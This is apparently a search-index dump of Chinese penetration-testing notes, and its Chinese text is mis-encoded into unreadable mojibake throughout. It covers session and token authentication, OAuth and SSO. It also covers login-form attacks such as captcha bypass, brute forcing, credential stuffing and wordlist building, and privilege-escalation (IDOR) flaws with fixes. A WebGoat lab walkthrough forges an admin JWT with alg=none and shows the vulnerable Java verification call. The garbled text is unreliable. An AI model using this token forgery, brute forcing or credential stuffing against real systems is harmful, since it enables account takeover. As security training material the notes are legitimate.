ä¾‹å¦‚ï¼Œä¸€ä¸ªç®¡ç†å‘˜è§’è‰²å¯èƒ½å…·æœ‰æ›´é«˜çº§åˆ«çš„æƒé™ï¼Œè€Œæ™®é€šç”¨æˆ·è§’è‰²åˆ™åªèƒ½æ‰§è¡ŒåŸºæœ¬æ“ä½œã€‚å½“ç”¨æˆ·å°è¯•è®¿é—®æŸä¸ªèµ„æºæ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥å…¶æ‰€å±çš„è§’è‰²æ˜¯å¦å…·æœ‰è¶³å¤Ÿçš„æƒé™æ¥æ‰§è¡Œè¯¥æ“ä½œã€‚å¦‚æœç”¨æˆ·æ‰€å±è§’è‰²ä¸å…·å¤‡æ‰€éœ€çš„æƒé™ï¼Œåˆ™è®¿é—®å°†è¢«æ‹’ç»ã€‚ token/cookie/session https://www.bilibili.com/video/BV1ob4y1Y7Ep cookie äº§ç”Ÿçš„åŸå›  å› ä¸ºhttpæ˜¯æ— çŠ¶æ€åè®®ï¼Œå‡è®¾æˆ‘ä»¥khazçš„èº«ä»½å»è®¿é—®æœåŠ¡å™¨ï¼Œç­‰åˆ°ä¸‹ä¸€æ¬¡æˆ‘å†æ¬¡è®¿é—®æœåŠ¡å™¨æ—¶ï¼ŒæœåŠ¡å™¨è¿˜æ˜¯ä¸çŸ¥é“æˆ‘æ˜¯è°ï¼Œæˆ‘ä»éœ€è¦å‘æœåŠ¡å™¨æäº¤æ•°æ®è¯´æ˜æˆ‘æ˜¯khazã€‚è¿™æ ·å°±å¯¼è‡´äº†åœ¨åŒä¸€ä¸ªç½‘ç«™ä¸‹æˆ‘æ¯æ¬¡è®¿é—®ä¸€ä¸ªæœåŠ¡éƒ½éœ€è¦æäº¤ä¸€æ¬¡æ•°æ®ï¼Œå¾ˆéº»çƒ¦ã€‚ æœ¬è´¨ æµè§ˆå™¨å­˜å‚¨æŠ€æœ¯ï¼Œå®ç°æ¯æ¬¡HTTPè¯·æ±‚éƒ½è‡ªåŠ¨æäº¤æ•°æ®ç»™æœåŠ¡å™¨çš„æŠ€æœ¯ã€‚ æœºåˆ¶ å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»å½•åï¼ŒæœåŠ¡å™¨è¿”å›çš„responseä¸­ä¼šæœ‰ä¸€ä¸ªset-cookieå­—æ®µï¼Œå½“æˆ‘ä»¬çš„æµè§ˆå™¨æ¥æ”¶åˆ°responseåï¼Œå°±ä¼šå°†set-cookieä¸­çš„å€¼ä¿å­˜åˆ°cookieä¸­ï¼Œç„¶åæ¯æ¬¡æˆ‘ä»¬ç™»é™†æ—¶æµè§ˆå™¨å°±ä¼šè‡ªåŠ¨åœ¨è¯·æ±‚ä¸­ä¸ºæˆ‘ä»¬å¸¦ä¸Šcookieï¼ŒæœåŠ¡ç«¯æ¥æ”¶åå»æ•°æ®åº“ä¸­æ ¸å®cookieä¿¡æ¯ã€‚ å®ä¾‹ é€šå¸¸ï¼Œæˆ‘ä»¬å¯ä»¥ä»å¾ˆå¤šç½‘ç«™çš„ç™»å½•ç•Œé¢ä¸­çœ‹åˆ°â€œè¯·è®°ä½æˆ‘â€è¿™æ ·çš„é€‰é¡¹ï¼Œå¦‚æœä½ å‹¾é€‰äº†å®ƒä¹‹åå†ç™»å½•ï¼Œé‚£ä¹ˆåœ¨ä¸‹ä¸€æ¬¡è®¿é—®è¯¥ç½‘ç«™çš„æ—¶å€™å°±ä¸éœ€è¦è¿›è¡Œé‡å¤è€Œç¹ççš„ç™»å½•åŠ¨ä½œäº†ï¼Œè€Œè¿™ä¸ªåŠŸèƒ½å°±æ˜¯é€šè¿‡Cookieå®ç°çš„ã€‚ session äº§ç”Ÿçš„åŸå›  å› ä¸ºcookieæ˜¯ä¿å­˜åœ¨æµè§ˆå™¨ä¸­çš„ï¼Œç”¨æˆ·å¯ä»¥éšæ„æŸ¥çœ‹å’Œä¿®æ”¹å¾ˆä¸å®‰å…¨ã€‚ æœ¬è´¨ ä¸€ç§æ¦‚å¿µã€‚è®©HTTPä»æ— çŠ¶æ€è¿æ¥å˜ä¸ºæœ‰çŠ¶æ€è¿æ¥ï¼ˆä¼šè¯çŠ¶æ€ï¼‰ã€‚ æœºåˆ¶ å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»å½•åï¼ŒæœåŠ¡ç«¯ä¼šç”Ÿæˆsessionå¯¹è±¡ç”¨äºä¿å­˜ç”¨æˆ·ä¿¡æ¯ï¼ˆå¯ä»¥ä¿å­˜åœ¨å†…å­˜ï¼Œæ•°æ®åº“ç­‰åœ°æ–¹ï¼‰ï¼ŒåŒæ—¶é€šè¿‡set-cookieå­—æ®µå°†session-idä¿å­˜åˆ°æµè§ˆå™¨ä¸­ã€‚ åœ¨ä¼šè¯çš„æœ‰æ•ˆæœŸå†…ï¼Œå®¢æˆ·ç«¯æ¯æ¬¡è¯·æ±‚éƒ½ä¼šå¸¦ä¸Šsession-idï¼ŒæœåŠ¡ç«¯æ ¹æ®session-idæ‰¾åˆ°å¯¹åº”çš„sessionï¼Œæ ¸å®ç”¨æˆ·çš„èº«ä»½ã€‚ æ³¨ï¼šä¼šè¯çš„æœ‰æ•ˆæœŸæ˜¯é€šè¿‡è®¾ç½®cookieçš„æœ‰æ•ˆæœŸå®ç°çš„ã€‚ token äº§ç”Ÿçš„åŸå›  å› ä¸ºsessionçš„æœºåˆ¶ï¼ŒæœåŠ¡ç«¯éœ€è¦ä¿å­˜sessionï¼Œå°±ä¼šå‡ºç°ä¸€äº›é—®é¢˜ã€‚ä¾‹å¦‚ï¼š å¤§é‡sessionå¯¹è±¡çš„å­˜å‚¨å¸¦æ¥çš„å†…å­˜æ¶ˆè€— å„æœåŠ¡å™¨ä¹‹é—´sessionçš„å¤åˆ¶ ä¸“é—¨ç”¨äºå­˜å‚¨sessionçš„æœåŠ¡å™¨å®•æœº æœ¬è´¨ èº«ä»½ä»¤ç‰Œ æœºåˆ¶ å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»é™†åï¼ŒæœåŠ¡ç«¯ä¼šç”Ÿæˆä¸€ä¸ªtokenä»¤ç‰Œã€‚é€šè¿‡ set-cookieå­—æ®µä¿å­˜åˆ°æµè§ˆå™¨ä¸­ã€‚ åœ¨ä»¤ç‰Œçš„æœ‰æ•ˆæœŸå†…ï¼Œå®¢æˆ·ç«¯æ¯æ¬¡è¯·æ±‚éƒ½ä¼šå¸¦ä¸Štokenä»¤ç‰Œï¼ŒæœåŠ¡ç«¯é€šè¿‡ä¿å­˜çš„å¯†é’¥éªŒè¯ç­¾åæ¥æ ¸å¯¹ç”¨æˆ·èº«ä»½ã€‚ å®ä¾‹ JWTï¼ˆjson web tokenï¼‰ æ€»ç»“ èº«ä»½æ ¡éªŒæ‰‹æ®µ ä¿å­˜ä½ç½® cookie å®¢æˆ·ç«¯ä¿å­˜ï¼ŒæœåŠ¡ç«¯ä¸ä¿å­˜ session å®¢æˆ·ç«¯åªä¿å­˜session-idï¼ŒæœåŠ¡ç«¯ä¿å­˜sessionå¯¹è±¡ token å®¢æˆ·ç«¯ä¿å­˜tokenï¼ŒæœåŠ¡ç«¯åªä¿å­˜tokenç­¾åçš„å¯† OAUTH OAuthï¼ˆOpen Authorizationã€å¼€æ”¾æˆæƒåè®®ï¼‰ æ˜¯ä¸€ç§æˆæƒæ¡†æ¶ï¼Œå…è®¸ç”¨æˆ·æˆæƒç¬¬ä¸‰æ–¹åº”ç”¨è®¿é—®ä»–ä»¬çš„èµ„æºï¼Œè€Œä¸æš´éœ²å…¶å¯†ç ç­‰æ ¸å¿ƒä¿¡æ¯ã€‚OAuth 2.0æ˜¯å½“å‰å¹¿æ³›ä½¿ç”¨çš„ç‰ˆæœ¬ï¼Œé€šå¸¸ç”¨äºç¤¾äº¤ç™»å½•ç­‰åœºæ™¯ã€‚ä¾‹å¦‚ï¼Œåœ¨ç¬¬ä¸‰æ–¹ç½‘ç«™ä¸Šä½¿ç”¨å¾®ä¿¡æˆ–è€…QQä½œä¸ºè´¦å·è¿›è¡Œç™»å½•ï¼Œå°±æ˜¯ä½¿ç”¨çš„oauthåè®®ï¼Œåªè¿”å›ç»™ç¬¬ä¸‰æ–¹è¯¸å¦‚ç”¨æˆ·åã€å¤´åƒç­‰ä¿¡æ¯ï¼Œè€Œä¸ä¼šè¿”å›ç»™ç¬¬ä¸‰æ–¹å¯†ç ç­‰æ ¸å¿ƒæ•°æ®ã€‚ OAuth 2.0 çš„ä¸€ä¸ªç®€å•è§£é‡Š - é˜®ä¸€å³°çš„ç½‘ç»œæ—¥å¿— https://www.ruanyifeng.com/blog/2019/04/oauth_design.html é¦–å…ˆï¼Œå±…æ°‘å°åŒºå°±æ˜¯å‚¨å­˜ç”¨æˆ·æ•°æ®çš„ç½‘ç»œæœåŠ¡ã€‚æ¯”å¦‚ï¼Œå¾®ä¿¡å‚¨å­˜äº†æˆ‘çš„å¥½å‹ä¿¡æ¯ï¼Œè·å–è¿™äº›ä¿¡æ¯ï¼Œå°±å¿…é¡»ç»è¿‡å¾®ä¿¡çš„\"é—¨ç¦ç³»ç»Ÿ\"ã€‚ å…¶æ¬¡ï¼Œå¿«é€’å‘˜ï¼ˆæˆ–è€…è¯´å¿«é€’å…¬å¸ï¼‰å°±æ˜¯ç¬¬ä¸‰æ–¹åº”ç”¨ï¼Œæƒ³è¦ç©¿è¿‡é—¨ç¦ç³»ç»Ÿï¼Œè¿›å…¥å°åŒºã€‚ æœ€åï¼Œæˆ‘å°±æ˜¯ç”¨æˆ·æœ¬äººï¼ŒåŒæ„æˆæƒç¬¬ä¸‰æ–¹åº”ç”¨è¿›å…¥å°åŒºï¼Œè·å–æˆ‘çš„æ•°æ®ã€‚ ç®€å•è¯´ï¼ŒOAuth å°±æ˜¯ä¸€ç§æˆæƒæœºåˆ¶ã€‚æ•°æ®çš„æ‰€æœ‰è€…å‘Šè¯‰ç³»ç»Ÿï¼ŒåŒæ„æˆæƒç¬¬ä¸‰æ–¹åº”ç”¨è¿›å…¥ç³»ç»Ÿï¼Œè·å–è¿™äº›æ•°æ®ã€‚ç³»ç»Ÿä»è€Œäº§ç”Ÿä¸€ä¸ªçŸ­æœŸçš„è¿›å…¥ä»¤ç‰Œï¼ˆtokenï¼‰ï¼Œç”¨æ¥ä»£æ›¿å¯†ç ï¼Œä¾›ç¬¬ä¸‰æ–¹åº”ç”¨ä½¿ç”¨ã€‚ SSO-CASå•ç‚¹ç™»å½• SSOï¼ˆSingle Sign-Onï¼Œå•ç‚¹ç™»å½•ï¼‰æ˜¯ä¸€ç§èº«ä»½éªŒè¯æœºåˆ¶ï¼Œå…è®¸ç”¨æˆ·é€šè¿‡ä¸€æ¬¡ç™»å½•è®¿é—®å¤šä¸ªåº”ç”¨ç³»ç»Ÿï¼Œè€Œæ— éœ€ä¸ºæ¯ä¸ªç³»ç»Ÿå•ç‹¬ç™»å½•ã€‚CASï¼ˆCentral Authentication Serviceï¼Œä¸­å¤®è®¤è¯æœåŠ¡ï¼‰æ˜¯ä¸€ç§æµè¡Œçš„å¼€æºSSOåè®®ï¼Œå¹¿æ³›ç”¨äºå®ç°å•ç‚¹ç™»å½•ã€‚ä¾‹å¦‚ï¼Œhttps://xxx?url=æƒ³è®¿é—®çš„åœ°å€ä¼šå…ˆé‡å®šå‘åˆ°CASç»Ÿä¸€ç™»é™†åœ°å€ç™»é™†åå³å¯è®¿é—®ï¼Œæ ¡å›­OAç­‰ã€‚ èŠèŠå•ç‚¹ç™»å½•(SSO)ä¸­çš„CASè®¤è¯ - æ˜é‡‘ https://juejin.cn/post/7143566954597449759#heading-4 Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-24 21:52:55 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/05.èº«ä»½è®¤è¯/01.ç™»å½•æ¡†.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/05.èº«ä»½è®¤è¯/01.ç™»å½•æ¡†.html","title":"01.ç™»å½•æ¡†","keywords":"","body":" ç›®å½•æ‰«æ jsæ–‡ä»¶æå– æ•æ„Ÿä¿¡æ¯ æ¥å£æµ‹è¯• å›¾ç‰‡éªŒè¯ç ç»•è¿‡ çŸ­ä¿¡éªŒè¯ç ç»•è¿‡ æ•°æ®åŒ…åŠ å¯†ç»•è¿‡ ç ´è§£ å¿«é€Ÿå®šä½å‰ç«¯åŠ å¯†æ–¹æ³• | å›å¿†é£˜å¦‚é›ª BurpCrypto: å¯¹å•åŠ å¯†å‚æ•°çš„ç™»å½•æ¥å£è¿›è¡Œå¯†ç çˆ†ç ´çš„ä¸€ç§æ–¹æ³• â€“ Whwlsfb's Tech Blog è¾“å…¥ä¸€äº›å¸¸è§çš„å¼±å£ä»¤ï¼Œæ”¶é›†åŠ å¯†åçš„å€¼ï¼Œç„¶åå›ºå®šå¯†ç ï¼Œçˆ†ç ´ç”¨æˆ·å ä½¿ç”¨seleniumæ¨¡å—æ¨¡æ‹Ÿæ‰‹åŠ¨æäº¤ç»•è¿‡ è´¦å¯†çˆ†ç ´ èƒ½æšä¸¾ç”¨æˆ·åå°±å…ˆæšä¸¾ ç”¨æˆ·å é’ˆå¯¹ä¸åŒè¡Œä¸šï¼Œå­˜åœ¨çš„ç”¨æˆ·å¾ˆå¤šéƒ½æ˜¯ä¸ä¸€æ ·çš„ï¼Œå¯ä»¥å»äº†è§£ä¸€äº›è¡Œä¸šé»‘è¯ å¯†ç  å¯ä»¥çœ‹ä¸€ä¸‹å¯†ç çš„å¤æ‚åº¦è¦æ±‚æ¥ç”Ÿæˆå¯¹åº”å­—å…¸ ç¤¾å·¥å­—å…¸ç”Ÿæˆï¼š éœ€è¦å…ˆæ”¶é›†ä¸€ä¸‹é‚®ç®±ï¼Œå…¬å¸åï¼Œå·¥å·ï¼Œç½‘ç«™æ–‡ç« çš„ä½œè€…åç­‰ä¿¡æ¯ å…¶ä»– ``` å…¶ä»–ç«™ç‚¹çš„è´¦å·å’Œå¯†ç ç”¨äºæ’åº“ å¦‚æœçˆ†ç ´å‡ºäº†ç”¨æˆ·åï¼Œå¯ä»¥å°†å¯†ç å‚æ•°å€¼å›ºå®šä¸ºtrueï¼Œ1ï¼Œ0ï¼Œå¯¹å¯†ç å‚æ•°è¿›è¡Œçˆ†ç ´ å¦‚æœå­˜åœ¨é‚€è¯·ç ï¼Œå¯ä»¥å°è¯•ä¸€äº›ç‰¹æ®Šçš„æ•°å­—ç»„åˆ 666 666666 888 888888 ..... ``` Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-29 17:25:25 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/05.èº«ä»½è®¤è¯/02.è¶Šæƒ.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/05.èº«ä»½è®¤è¯/02.è¶Šæƒ.html","title":"02.è¶Šæƒ","keywords":"","body":"å‚ç›´è¶Šæƒ æƒé™æ ¡éªŒä¸å……åˆ†ï¼Œå¯¼è‡´ä½æƒé™ç”¨æˆ·å¯ä»¥è®¿é—®é«˜æƒé™ç”¨æˆ·çš„æ¥å£ï¼Œæ¯”å¦‚è¯´éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦æˆ·å°±èƒ½è®¿é—®å„ç§æŸ¥è¯¢æ¥å£ å¦‚ä½•æŒ–æ˜ï¼š å¦‚æœæœ‰ç®¡ç†å‘˜è´¦å·å’Œæ™®é€šç”¨æˆ·è´¦å·å°±æ¯”è¾ƒç®€å•ï¼Œç®¡ç†æ“ä½œï¼Œç„¶åæ›¿æ¢æ•°æ®åŒ…ä¸­çš„é‰´æƒéƒ¨åˆ†ä¸ºæ™®é€šç”¨æˆ·çš„ å¦‚æœåªæœ‰æ™®é€šç”¨æˆ·çš„è´¦å·ï¼Œæˆ‘è§‰å¾—ä¸»è¦æ˜¯å¦‚ä½•è·å¾—æ•æ„Ÿæ¥å£ï¼Œä¸€ç§æ˜¯é€šè¿‡è¢«åŠ¨æ‰«ææ¥æ‰¾åˆ°æ¥å£æ–‡æ¡£ï¼Œå¦ä¸€ç§æ˜¯é€šè¿‡ä»jsæ–‡ä»¶ä¸­æ‰‹åŠ¨æ„é€ æˆ–è€…fuzzæ¥å£çš„åç§° ä¿®å¤æ–¹æ¡ˆ è¿›è¡Œåˆç†çš„æƒé™åˆ’åˆ†ã€‚ æƒé™æœ€å°åŒ–åŸåˆ™ï¼Œé™åˆ¶ç”¨æˆ·ä¸å¿…è¦çš„æƒé™ï¼Œç”¨æˆ·æƒé™è¿‡æœŸååº”å½“äºˆä»¥å›æ”¶ã€‚ æ°´å¹³è¶Šæƒ æ™®é€šç”¨æˆ·æ‹¥æœ‰å…¶ä»–å¹³è¡Œçº§åˆ«ç”¨æˆ·çš„æƒé™ æ¯”è¾ƒå¸¸è§çš„å°±æ˜¯åœ¨è·å–ä¸ªäººä¿¡æ¯å¤„é€šè¿‡éå†idè·å¾—å…¶ä»–ç”¨æˆ·çš„ä¸ªäººä¿¡æ¯ï¼Œè¿˜æœ‰é€šè¿‡useridï¼Œxxidï¼Œ/user/useridæ¥è¿›è¡ŒæŸ¥è¯¢ æœ€å¥½çš„è¯è¿˜æ˜¯æ³¨å†Œä¸¤ä¸ªè´¦æˆ·è¿›è¡Œæµ‹è¯•ï¼Œè¿™æ ·æ›´å¥½å‘ç°å‚æ•°åŒºåˆ« è¶Šæƒæ¼æ´å’Œéå†æ¼æ´çš„åŒºåˆ«ï¼š åŠŸèƒ½ç‚¹çš„æƒé™åˆ†é…ä¸åŒã€‚è¶Šæƒæ¼æ´äº§ç”Ÿçš„åŠŸèƒ½ç‚¹æ˜¯å±äºç‰¹å®šç”¨æˆ·æ‰èƒ½ä½¿ç”¨çš„ï¼Œè€Œéå†æ¼æ´äº§ç”Ÿçš„åŠŸèƒ½ç‚¹æ˜¯åº”ç”¨æœ¬èº«å°±éœ€è¦ç”¨åˆ°çš„ï¼Œåªæ˜¯åº”ç”¨æ²¡æœ‰åšå¥½é¢‘ç‡æ§åˆ¶å’Œæ•°æ®æ‹–å–é™åˆ¶ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡éå†æŸä¸ªå‚æ•°è·å¾—å¤§é‡æ•æ„Ÿä¿¡æ¯ï¼Œä»è€Œé€ æˆå±å®³ã€‚ ä¿®å¤æ–¹æ¡ˆ ä¸€å¯¹ä¸€ï¼Œç”¨æˆ·idå¯¹åº”ä¸€æ¡æ•°æ®ï¼Œæ¯”å¦‚æŸ¥çœ‹ä¸ªäººä¿¡æ¯ ç”¨æˆ·idä¸åº”è¯¥ç”±ç”¨æˆ·çš„ä¼ å‚æ¥å†³å®šï¼Œåº”è¯¥ä»sessionä¸­è·å–ç”¨æˆ·idï¼Œç„¶åå¸¦å…¥æ•°æ®åº“ä¸­è¿›è¡ŒæŸ¥è¯¢ ä¸€å¯¹å¤šï¼Œç”¨æˆ·idå¯¹åº”å¤šæ¡æ•°æ®ï¼Œæ¯”å¦‚ä¸€ä¸ªç”¨æˆ·æœ‰å¤šä¸ªè®¢å• è¡¨ç»“æ„åœ¨è®¾è®¡ä¹‹åˆåº”è€ƒè™‘è®¢å•å’Œç”¨æˆ·å¯¹åº”çš„å…³ç³» | order_id | order_no | user_id | total_price | pay_status | pay_type | extra_info | | -------- | ----------------- | ------- | ----------- | ---------- | -------- | ---------- | | 1 | 15688187285093508 | 1 | 2492 | 1 | 2 | | | 2 | 15885800076852966 | 10 | 2245 | 1 | 1 | | å¯ä»¥çœ‹åˆ°å­˜åœ¨å…¶ä¸­order_noå’Œuser_idå­˜åœ¨å¯¹åº”å…³ç³»ï¼Œæ‰€ä»¥å°†orderNoå’Œä»sessionä¸­è·å–çš„userIdåŒæ—¶æŸ¥è¯¢å¯è§£å†³è¶Šæƒé—®é¢˜ã€‚ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-24 21:32:50 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/05.èº«ä»½è®¤è¯/03.JWT.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/05.èº«ä»½è®¤è¯/03.JWT.html","title":"JWTå®‰å…¨","keywords":"","body":"JWTè®¤è¯† æ¦‚å¿µ JSON Web Tokenï¼ˆJSON Web ä»¤ç‰Œï¼‰æ˜¯ä¸€ç§è·¨åŸŸéªŒè¯èº«ä»½çš„æ–¹æ¡ˆã€‚JWT ä¸åŠ å¯†ä¼ è¾“çš„æ•°æ®ï¼Œä½†èƒ½å¤Ÿé€šè¿‡æ•°å­—ç­¾åæ¥éªŒè¯æ•°æ®æœªè¢«ç¯¡æ”¹ã€‚ ä»¤ç‰Œå·¥ä½œæµç¨‹ æµè§ˆå™¨å‘èµ·è¯·æ±‚ç™»é™† æœåŠ¡ç«¯éªŒè¯èº«ä»½ï¼Œæ ¹æ®ç®—æ³•ï¼Œå°†ç”¨æˆ·æ ‡è¯†ç¬¦æ‰“åŒ…ç”Ÿæˆ token, å¹¶ä¸”è¿”å›ç»™æµè§ˆå™¨ æµè§ˆå™¨å‘èµ·è¯·æ±‚è·å–ç”¨æˆ·èµ„æ–™ï¼ŒæŠŠåˆšåˆšæ‹¿åˆ°çš„ token ä¸€èµ·å‘é€ç»™æœåŠ¡å™¨ æœåŠ¡å™¨å‘ç°æ•°æ®ä¸­æœ‰ tokenï¼ŒéªŒè¯ç­¾åå¹¶è¯†åˆ«ç”¨æˆ·èº«ä»½ æœåŠ¡å™¨è¿”å›è¯¥ç”¨æˆ·çš„ç”¨æˆ·èµ„æ–™ ç»„æˆ JWT åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼Œå¤´éƒ¨ï¼ˆHeaderï¼‰ï¼Œå£°æ˜ï¼ˆClaimsï¼‰ï¼Œç­¾åï¼ˆSignatureï¼‰ï¼Œä¸‰ä¸ªéƒ¨åˆ†ä»¥è‹±æ–‡å¥å·.éš”å¼€ã€‚ hearderå’ŒClaims çš„å†…å®¹ä»¥ Base64URL è¿›è¡Œäº†ç¼–ç ã€‚ Base64URL From ç»´åŸºç™¾ç§‘ å¤´éƒ¨ï¼ˆHeaderï¼‰ { \"alg\":\"HS256\", \"kid\":\"webgoat_key\", \"typ\":\"JWT\" } å‚æ•°è¯´æ˜: algorithmï¼ˆalgï¼‰ :è¯´æ˜JWTç­¾åä½¿ç”¨çš„ç®—æ³•ï¼Œå¸¸è§æœ‰HS256ï¼ˆé»˜è®¤ï¼‰ï¼ŒRS256 ç­‰ï¼Œä¹Ÿå¯ä»¥ä¸º Noneä¸è¿›è¡Œç­¾åã€‚ kidï¼šç”¨æ¥æŒ‡å®šéªŒè¯ç­¾åçš„å¯†é’¥ typ:è¯´æ˜è¿™ä¸ª token çš„ç±»å‹ä¸º JWT (å¯é€‰å‚æ•°) å£°æ˜ï¼ˆClaimsï¼‰ { \"secretid\":\" \" \"aud\": \"webgoat.org\", \"iat\": 1644039735, \"exp\": 1644039795, \"sub\": \"tom@webgoat.org\", \"jti\":\"xxx\", \"nbf\":xxx } å‚æ•°è¯´æ˜ï¼š secretidï¼šå¯†é’¥idå€¼ï¼Œå½“å…¶ä¸ºç©ºæ—¶ï¼Œjwté»˜è®¤algä¸ºnone audï¼šæ¥æ”¶jwtçš„ç”¨æˆ· iatï¼šä»¤ç‰Œç”Ÿæ•ˆæ—¶é—´ expï¼šä»¤ç‰Œåˆ°æœŸæ—¶é—´ subï¼šä¸»é¢˜ jtiï¼š jwtçš„å”¯ä¸€èº«ä»½æ ‡è¯†ï¼Œä¸»è¦ç”¨æ¥ä½œä¸ºä¸€æ¬¡æ€§token,ä»è€Œå›é¿é‡æ”¾æ”»å‡» nbfï¼šå®šä¹‰åœ¨ä»€ä¹ˆæ—¶é—´ä¹‹å‰ï¼Œè¯¥jwtéƒ½æ˜¯ä¸å¯ç”¨çš„. æ–‡æ¡£ï¼šhttps://datatracker.ietf.org/doc/html/rfc7519#section-4.1 ç­¾åï¼ˆSignatureï¼‰ â€‹ æœåŠ¡å™¨æœ‰ä¸€ä¸ªä¸ä¼šå‘é€ç»™å®¢æˆ·ç«¯çš„å¯†ç ï¼ˆsecretï¼‰ï¼Œç”¨å¤´éƒ¨ä¸­æŒ‡å®šçš„ç®—æ³•å¯¹å¤´éƒ¨å’Œå£°æ˜çš„å†…å®¹ï¼ˆbase64ç¼–ç åçš„ï¼‰ç”¨æ­¤å¯†ç è¿›è¡ŒåŠ å¯†ï¼Œç”Ÿæˆçš„å­—ç¬¦ä¸²å°±æ˜¯ JWT çš„ç­¾åã€‚ ä»¥HMAC SHA256ä¸ºä¾‹ HMACSHA256(base64UrlEncode(header) + \".\" + base64UrlEncode(claims),secret) ä½¿ç”¨ åœ¨http headerä¸­æ·»åŠ  Authorization: Bearer å®‰å…¨æ€§ é˜²ç¯¡æ”¹å–å†³äºç§é’¥å’ŒåŠ å¯†ç®—æ³•çš„å®‰å…¨æ€§ã€‚ å› ä¸ºç­¾åæ‰€ä»¥JWTèƒ½å¤Ÿé˜²ç¯¡æ”¹èµ·åˆ°è®¤è¯åŠŸèƒ½ï¼Œä½†æ˜¯å¯¹äºheaderå’ŒClaimséƒ¨åˆ†åªè¿›è¡Œäº†base64URLç¼–ç ï¼Œè¿™æ„å‘³ç€ä»»ä½•äººéƒ½å¯ä»¥è¯»å–åˆ°è¿™éƒ¨åˆ†çš„ä¿¡æ¯ï¼Œæ‰€ä»¥é™¤éåŠ å¯†ï¼Œå¦åˆ™ä¸è¦åœ¨JWTçš„æœ‰æ•ˆè´Ÿè½½æˆ–æŠ¥å¤´å…ƒç´ ä¸­æ”¾ç½®ç§˜å¯†ä¿¡æ¯ã€‚ å¦‚ä½•ç”ŸæˆJWT ç­¾åè§£æç½‘ç«™ JSON Web Tokens - jwt.io python å®‰è£…æ¨¡å— https://stackoverflow.com/questions/33198428/jwt-module-object-has-no-attribute-encode pip uninstall JWT pip uninstall PyJWT pip install PyJWT==1.7.1 import jwt import base64 payload = { } key = \"\" headers = { } # è°ƒç”¨jwtåº“,ç”Ÿæˆjson web token jwt_token = jwt.encode(payload=payload, # payload, æœ‰æ•ˆè½½ä½“ key=key, # è¿›è¡ŒåŠ å¯†ç­¾åçš„å¯†é’¥ algorithm=\"HS256\", # æŒ‡æ˜ç­¾åç®—æ³•æ–¹å¼, é»˜è®¤ä¹Ÿæ˜¯HS256 headers=headers # json web token æ•°æ®ç»“æ„åŒ…å«ä¸¤éƒ¨åˆ†, payload(æœ‰æ•ˆè½½ä½“), headers(æ ‡å¤´) ).decode('ascii') # python3 ç¼–ç åå¾—åˆ° bytes, å†è¿›è¡Œè§£ç (æŒ‡æ˜è§£ç çš„æ ¼å¼), å¾—åˆ°ä¸€ä¸ªstr print(jwt_token) JWTæ£€æµ‹ JAVAweb æ•°æ®åŒ…è¯·æ±‚å¤´ Authorization: Bearer æ•°æ®åŒ…æ•°æ®æ ¼å¼ æ”»å‡»æ‰‹æ®µ æœªå¯¹ç­¾åè¿›è¡ŒéªŒè¯ WebGoat JWT 12 ç­¾åç®—æ³•ç½®Noneå¯¼è‡´çš„ä¸æ ¡éªŒç­¾å å®éªŒ WebGoat JWT 5 ç‚¹å‡»resetæŒ‰é’®ï¼ŒæŠ“å–æ•°æ®åŒ…ï¼Œå°†æ•°æ®åŒ…ä¸­çš„tokenè¿›è¡Œè§£å¯† å‘ç°åœ¨å£°æ˜éƒ¨åˆ†æœ‰adminå‚æ•°å€¼ä¸ºfalseï¼Œåº”è¯¥å°±æ˜¯æ ¹æ®è¿™ä¸ªæ¥åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ä¸ºç®¡ç†å‘˜ å°†adminå€¼ä¿®æ”¹ä¸ºtrue è¿™æ—¶å€™ä¿®æ”¹äº†å£°æ˜éƒ¨åˆ†çš„å†…å®¹ï¼Œç­¾åå°±å¤±æ•ˆäº†ï¼Œæ‰€ä»¥è¦ç»•è¿‡ç­¾åéªŒè¯ å°†å¤´éƒ¨algå€¼æ”¹ä¸ºnoneï¼Œè®©æœåŠ¡å™¨ä¸è¿›è¡Œç­¾åéªŒè¯ import jwt token = jwt.encode( { \"iat\": 1686993728, \"admin\": \"true\", \"user\": \"Jerry\" } ,algorithm=\"none\",key=\"\") print(token) å½¢æˆåŸå›  try { Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken); Claims claims = (Claims) jwt.getBody(); String user = (String) claims.get(\"user\"); boolean isAdmin = Boolean.valueOf((String) claims.get(\"admin\")); if (isAdmin) { removeAllUsers(); } else { log.error(\"You are not an admin user\"); } } catch (JwtException e) { throw new InvalidTokenException(e); } å…³é”®ç‚¹åœ¨äº Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken); ä½¿ç”¨äº†é”™è¯¯çš„å‡½æ•°parse(accessToken)ï¼Œè€Œä¸æ˜¯parseClaimsJws(accessToken)ï¼Œå¯¼è‡´jwtéªŒè¯æˆåŠŸ æ­£å¸¸æƒ…å†µä¸‹ Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parseClaimsJws(accessToken); Jwts.parser() åˆ›å»ºäº†ä¸€ä¸ªJwtParserç±»çš„å®ä¾‹ï¼Œç”¨äºè§£æå’ŒéªŒè¯JWTã€‚ setSigningKey(JWT_PASSWORD) 